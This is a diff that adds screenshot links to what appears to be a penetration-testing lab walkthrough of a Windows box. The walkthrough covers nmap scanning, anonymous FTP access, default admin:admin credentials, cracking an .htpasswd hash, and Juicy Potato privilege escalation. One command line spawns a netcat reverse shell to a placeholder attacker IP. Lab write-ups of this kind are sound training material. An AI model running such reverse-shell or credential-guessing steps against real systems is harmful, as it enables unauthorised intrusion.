@@ -28,6 +28,8 @@ variants don't apply.
 sudo nmap -p- -sCV <TARGET_IP>
 ```
 
+![nmap service scan](./assets/authby/01-nmap.png)
+
 FTP stood out as the entry point worth probing first.
 
 ---
@@ -37,7 +39,9 @@ FTP stood out as the entry point worth probing first.
 Anonymous FTP login worked, and browsing the anonymous share revealed
 account names (including `admin`). Trying the obvious `admin:admin`
 credential pair against the same FTP service succeeded, giving access to
-`.htpasswd`/`.htaccess` files — which contained a password hash for another
+`.htpasswd`/`.htaccess` files
+
+![.htpasswd hash pulled over FTP](./assets/authby/02-htpasswd-creds.png) — which contained a password hash for another
 account.
 
 Cracking the hash offline with John recovered a working password, which
@@ -63,6 +67,8 @@ invocation to spawn a reverse shell as SYSTEM:
 ```
 JuicyPotatox86.exe -l 1360 -p C:\windows\system32\cmd.exe -a "/c C:\path\to\nc.exe -e cmd.exe <ATTACKER_IP> 1234" -t * -c {CLSID}
 ```
+
+![running the Juicy Potato x86 exploit to SYSTEM](./assets/authby/03-juicy-potato.png)
 
 ---
 
